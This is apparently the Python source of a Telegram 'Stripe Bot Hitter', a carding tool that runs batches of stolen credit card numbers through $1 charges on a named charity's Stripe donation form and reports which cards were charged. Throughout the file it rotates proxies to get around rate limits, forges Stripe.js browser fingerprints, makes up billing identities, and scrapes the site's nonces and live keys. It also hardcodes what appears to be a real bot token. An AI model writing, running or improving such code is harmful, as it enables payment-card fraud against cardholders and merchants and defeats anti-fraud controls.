
import telebot
import requests
import re
import random
import time
import uuid
import os
from faker import Faker
from user_agent import generate_user_agent
import logging

"""
Stripe Bot Hitter - Professional Edition
=========================================

Description:
This bot is designed to perform mass checking of credit cards against a Stripe 1$ donation gateway.
It features advanced rate-limit bypassing through proxy rotation, dynamic form value fetching,
and standard Stripe.js v3 fingerprinting generation.

Features:
- Proxy Support: Rotates proxies from a 'proxies.txt' file to avoid IP-based blocks.
- Dynamic Fetching: Automatically extracts nonces, form IDs, and publishable keys from the target site.
- Fingerprinting: Generates dynamic MUID, SID, and GUID for every request to mimic real browser behavior.
- Optimized Payload: Sends only the necessary fields to the Stripe gateway to minimize detection.
- Mass Checking: Handles up to 100 cards per request with batch updates.

Requirements:
- pyTelegramBotAPI
- requests
- faker
- user-agent

Usage:
1. Place your proxies in 'proxies.txt' (format: http://user:pass@host:port).
2. Set your Telegram Bot Token in the API_TOKEN variable.
3. Run the script: python stripe_bot_updated.py
"""

# Configure logging with a detailed format for better debugging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot_activity.log")
    ]
)

# Replace with your actual Telegram Bot Token
API_TOKEN = '8075455874:AAGxl7ELCNce4BJtvMn8pDqb2TPr6oPPBrk'

bot = telebot.TeleBot(API_TOKEN)
fake = Faker()

# --- Proxy Management ---
PROXIES_FILE = 'proxies.txt' # Using relative path for better portability
proxies_list = []

def load_proxies():
    """Loads proxies from the local file into memory."""
    global proxies_list
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies_list)} proxies from {PROXIES_FILE}")
    else:
        # Create the file if it doesn't exist
        with open(PROXIES_FILE, 'w') as f:
            pass
        logging.warning(f"Proxies file not found. Created empty {PROXIES_FILE}.")

def save_proxy(proxy_str):
    """Saves a new proxy string to the file and updates the list."""
    global proxies_list
    # Convert ip:port:user:pass to http://user:pass@ip:port
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        formatted_proxy = f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        formatted_proxy = f"http://{ip}:{port}"
    else:
        return False, "Invalid format. Use ip:port:user:pass or ip:port"

    with open(PROXIES_FILE, 'a') as f:
        f.write(formatted_proxy + '\n')
    
    proxies_list.append(formatted_proxy)
    return True, formatted_proxy

def get_random_proxy():
    """Returns a random proxy from the list in requests format."""
    if proxies_list:
        proxy = random.choice(proxies_list)
        return {'http': proxy, 'https': proxy}
    return None

# Initial load
load_proxies()

# --- Helper Functions ---
def get_ids():
    return str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())

def get_form_data(session, ua):
    """
    Fetches dynamic form data (charitable_form_id, _charitable_donation_nonce, campaign_id)
    and the Stripe publishable key from the donation page.
    """
    try:
        # Use a fresh session for each attempt to avoid session-based blocks
        session.headers.update({'User-Agent': ua})
        proxy = get_random_proxy()
        logging.info(f"Fetching form data with proxy: {proxy}")
        r = session.get("https://ccfoundationorg.com/donate/", headers={'User-Agent': ua}, proxies=proxy, timeout=20)
        
        if r.status_code != 200:
            logging.error(f"Failed to get form data. Status code: {r.status_code}")
            return None
        
        html = r.text
        
        # Extract dynamic values using regex
        fid = re.search(r'name="charitable_form_id" value="([^"]+)"', html)
        nonce = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html)
        cid = re.search(r'name="campaign_id" value="([^"]+)"', html)
        pk = re.search(r'"key":"(pk_live_[^"]+)"', html) or re.search(r'pk_live_[a-zA-Z0-9_]+', html)
        
        if not all([fid, nonce, cid, pk]):
            logging.error("One or more form data elements not found.")
            return None
        
        publishable_key = pk.group(1) if pk.groups() else pk.group(0)
        logging.info(f"Successfully fetched form data. PK: {publishable_key}")
        return publishable_key, fid.group(1), nonce.group(1), cid.group(1)
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed while fetching form data: {e}")
        return None
    except Exception as e:
        logging.error(f"An unexpected error occurred while fetching form data: {e}")
        return None

def create_pm(session, ua, pk, cc, mm, yy, cvc, fake):
    """
    Creates a Stripe Payment Method using the Stripe API.
    """
    guid, muid, sid = get_ids() # Generate new UUIDs for each request
    fn, ln = fake.first_name(), fake.last_name()
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': ua,
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': f'{fn} {ln}',
        'billing_details[email]': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': fake.zipcode(),
        'card[number]': cc,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/33c734767c; stripe-js-v3/33c734767c; card-element', # This might need to be dynamic
        'referrer': 'https://ccfoundationorg.com',
        'time_on_page': str(random.randint(30000, 90000)),
        'key': pk,
    }
    
    try:
        proxy = get_random_proxy()
        logging.info(f"Creating payment method with proxy: {proxy}")
        r = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, proxies=proxy, timeout=20)
        res = r.json()
        
        if r.status_code == 200:
            logging.info(f"Payment method created successfully. ID: {res.get('id')}")
            return res.get('id'), None
        
        err = res.get('error', {})
        error_message = err.get('message') or err.get('code') or 'Unknown Error'
        logging.warning(f"Failed to create payment method: {error_message}")
        return None, error_message
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed while creating payment method: {e}")
        return None, str(e)
    except Exception as e:
        logging.error(f"An unexpected error occurred while creating payment method: {e}")
        return None, str(e)

def pay(session, ua, fid, nonce, cid, pm, fake):
    """
    Submits the donation form to complete the payment.
    """
    fn, ln = fake.first_name(), fake.last_name()
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://ccfoundationorg.com',
        'referer': 'https://ccfoundationorg.com/donate/',
        'user-agent': ua,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    # Only include essential fields for a $1 Stripe gateway transaction
    data = {
        'charitable_form_id': fid,
        fid: '', # This field seems to be dynamic and empty, keep it as is
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/donate/',
        'campaign_id': cid,
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'recurring_donation': 'once',
        'first_name': fn,
        'last_name': ln,
        'email': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
        'gateway': 'stripe',
        'stripe_payment_method': pm,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    
    try:
        proxy = get_random_proxy()
        logging.info(f"Submitting payment with proxy: {proxy}")
        r = session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=data, proxies=proxy, timeout=25)
        res = r.json()
        
        if res.get('success'): 
            logging.info("Payment successful: APPROVED ✅ $1 Charged")
            return True, "APPROVED ✅ $1 Charged"
        
        errors = res.get('errors', [])
        if errors:
            msg = errors[0] if isinstance(errors, list) else str(errors)
            logging.warning(f"Payment failed with errors: {msg}")
            return False, msg
        
        logging.warning("Payment failed: Card Declined (no specific error message)")
        return False, "Card Declined"
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed while submitting payment: {e}")
        # Checking for success keywords in response text as per requirements
        resp_text = r.text.lower() if 'r' in locals() else ""
        success_keywords = ['thank', 'thank you', 'charged', 'approved', 'success', 'successful']
        if any(kw in resp_text for kw in success_keywords):
            logging.info("Payment successful (from response text): APPROVED ✅ $1 Charged")
            return True, "APPROVED ✅ $1 Charged"
        return False, f"Error: {str(e)}"
    except Exception as e:
        logging.error(f"An unexpected error occurred while submitting payment: {e}")
        return False, f"Error: {str(e)}"

def check_single_card(card_str):
    """
    Checks a single credit card using the Stripe gateway.
    """
    parts = re.split(r'[|:/]', card_str.strip())
    if len(parts) < 4:
        return None, "Invalid Format", card_str

    cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4: yy = yy[2:]
    
    session = requests.Session() # Use a new session for each card check
    ua = generate_user_agent()
    
    data = get_form_data(session, ua)
    
    if not data:
        return False, "Site Down or Form Data Error", f"{cc}|{mm}|{yy}|{cvc}"

    pk, fid, nonce, cid = data
    pm, err = create_pm(session, ua, pk, cc, mm, yy, cvc, fake)
    
    if not pm:
        return False, err, f"{cc}|{mm}|{yy}|{cvc}"

    success, result_msg = pay(session, ua, fid, nonce, cid, pm, fake)
    
    # Check for charged keywords in the result message or response
    charged_keywords = ['thank', 'thank you', 'charged', 'approved', 'success', 'successful']
    is_charged = any(kw in result_msg.lower() for kw in charged_keywords)
    
    return is_charged, result_msg, f"{cc}|{mm}|{yy}|{cvc}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "꒰ ✅ ꒱   𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗  —  𝗛𝗜𝗧𝗧𝗘𝗥\n\n"
        "꒰ 💰 ꒱   𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗔𝗰𝘁𝗶𝘃𝗲  ⤵\n"
        "   ▸   status   ·  𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ✓\n"
        "   ▸   access   ·  𝗔𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘂𝗻𝗹𝗼𝗰𝗸𝗲𝗱\n\n"
        "꒰ ⚡️ ꒱   𝗚𝗲𝘁 𝗦𝘁𝗮𝗿𝘁𝗲𝗱  ⤵\n\n"
        "   ▸   /chk     ·  Single check\n"
        "   ▸   /mass    ·  Mass check\n"
        "   ▸   /addproxy · Add proxy (ip:port:user:pass)\n\n"
        "   ❤️  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗜𝗧𝗧𝗘𝗥  ⭐️"
    )
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['addproxy'])
def add_proxy_handler(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /addproxy ip:port:user:pass")
        return

    proxy_str = args[1]
    success, result = save_proxy(proxy_str)
    
    if success:
        bot.reply_to(message, f"✅ Proxy added successfully!\n`{result}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ Failed to add proxy: {result}")

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx")
        return

    card_str = args[1]
    proc_msg = bot.reply_to(message, "🔍 Checking your card, please wait...")
    
    success, result_msg, card_info = check_single_card(card_str)
    
    if success is None:
        bot.edit_message_text(f"❌ {result_msg}", chat_id=message.chat.id, message_id=proc_msg.message_id)
        return

    status_emoji = "꒰ ✅ ꒱   𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" if success else "꒰ ❌ ꒱   𝗗𝗲𝗮𝗱"
    
    resp_text = (
        f"{status_emoji}  —  𝗦𝘁𝗿𝗶𝗽𝗲 𝗣𝗮𝘆𝗺𝗲𝗻𝘁𝘀\n\n"
        "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
        f"   ▸  num  · {card_info}\n"
        "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
        f"   ▸  resp · {result_msg}\n\n"
        f"🔄  {time.time() - start_time:.2f}s"
    )
    bot.edit_message_text(resp_text, chat_id=message.chat.id, message_id=proc_msg.message_id)

@bot.message_handler(commands=['mass'])
def mass_handler(message):
    # User must reply /mass to a .txt file
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a .txt file containing the card list.")
        return

    if not message.reply_to_message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "Only .txt files are supported.")
        return

    start_time = time.time()
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8')
    except:
        content = downloaded_file.decode('latin-1')
        
    cards = re.findall(r'\d{15,16}[|:/]\d{1,2}[|:/]\d{2,4}[|:/]\d{3,4}', content)
    
    if not cards:
        bot.reply_to(message, "No valid cards found in the file.")
        return

    cards = cards[:100] # Limit to 100 cards as per requirement
    total_cards = len(cards)
    
    charged_count = 0
    dead_count = 0
    error_count = 0
    
    # Initial summary message
    summary_msg = bot.reply_to(message, "꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...")
    
    def update_summary(status_label="𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴..."):
        elapsed = time.time() - start_time
        total_checked = charged_count + dead_count + error_count
        hit_rate = (charged_count / total_checked * 100) if total_checked > 0 else 0
        
        text = (
            f"꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  {status_label}\n\n"
            "꒰ 🔄 ꒱   𝗦𝘂𝗺𝗺𝗮𝗿𝘆  ⤵\n"
            f"   ▸   𝗰𝗮𝗿𝗱𝘀    · {total_checked}/{total_cards}\n"
            f"   ▸   𝗲𝗹𝗮𝗽𝘀𝗲𝗱  · {int(elapsed)}s\n"
            f"   ▸   𝗵𝗶𝘁 𝗿𝗮𝘁𝗲 · {hit_rate:.1f}%\n\n"
            "꒰ 📰 ꒱   𝗛𝗶𝘁 𝗖𝗼𝘂𝗻𝘁  ⤵\n"
            f"   ▸   💰 𝗖𝗵𝗮𝗿𝗴𝗲𝗱  · {charged_count}\n"
            f"   ▸   ❌ 𝗗𝗘𝗔𝗗     · {dead_count}\n"
            f"   ▸   ⛔️ 𝗘𝗿𝗿𝗼𝗿    · {error_count}"
        )
        try:
            bot.edit_message_text(text, chat_id=message.chat.id, message_id=summary_msg.message_id)
        except:
            pass

    # Batch processing in branches of 10
    batch_size = 10
    for i in range(0, total_cards, batch_size):
        batch = cards[i:i + batch_size]
        hits_in_batch = []
        
        for card_str in batch:
            success, result_msg, card_info = check_single_card(card_str)
            
            if success is True:
                charged_count += 1
                hits_in_batch.append((card_info, result_msg))
            elif success is False:
                if any(err in result_msg for err in ["Site Down", "Error", "Exception"]):
                    error_count += 1
                else:
                    dead_count += 1
            else:
                error_count += 1
        
        # After completing a batch of 10, send charged cards to user
        for card_info, result_msg in hits_in_batch:
            hit_text = (
                "꒰ ✅ ꒱   𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  —  𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗔𝗦𝗦\n\n"
                "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
                f"   ▸  num  · {card_info}\n"
                "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
                f"   ▸  resp · {result_msg}\n"
            )
            bot.send_message(message.chat.id, hit_text)
            
        # Update summary message after each batch
        update_summary()
    
    # Final update
    update_summary("𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲")

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
